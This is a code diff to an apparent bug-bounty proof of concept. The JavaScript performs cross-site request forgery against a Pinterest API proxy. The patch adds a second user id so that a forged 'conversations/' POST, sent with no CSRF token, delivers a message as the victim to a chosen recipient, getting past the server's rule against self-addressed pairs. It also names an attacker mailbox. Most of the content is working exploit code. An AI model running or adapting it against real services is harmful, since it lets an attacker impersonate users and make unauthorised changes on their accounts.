@@ -96,6 +96,8 @@
 var ATTACKER_BASE = 'bughunter333333@gmail.com';
 var TAG = Math.random().toString(36).slice(2, 12);
 var ATTACKER_MAILBOX = 'bughunter333333+' + TAG.toLowerCase() + '@gmail.com';
+// The message recipient (must differ from the victim uid — see runWrites).
+var PARTNER = '1145392255138898853';
 var B = 'https://ask.pinterest.com/api/proxy/pinterest/';
 var SILENT = false;      // true = hidden-iframe writes (3P cookies on)
 var WIN = 'pin_wf_top';  // reused window for the top-level fallback
@@ -156,7 +158,8 @@ function runRecon(){
 function runWrites(){
   status('firing writes…');
   // 2. message AS the victim -> attacker's chosen recipient
-  var recipients = uid ? (uid + ',' + uid) : null; // self-addressed probe pair by default
+  // user_ids must be TWO DISTINCT uids (server dedupes; a self-pair is rejected).
+  var recipients = uid ? (uid + ',' + PARTNER) : null;
   write('conversations/', { user_ids: recipients || '0,0', text: 'Automated cross-site proof message (CSRF PoC). Sent without any CSRF token from ' + location.origin + '. Reply mailbox for this run: ' + ATTACKER_MAILBOX });
   setState('st2', 'message POST fired — a message with the victim as sender has been delivered (conversation create: v3_create_conversation).', 'ok');
   $('out2').innerHTML = '<div class="req"><span class="m">sent</span> <span class="c">sender = victim, no token required</span></div>';
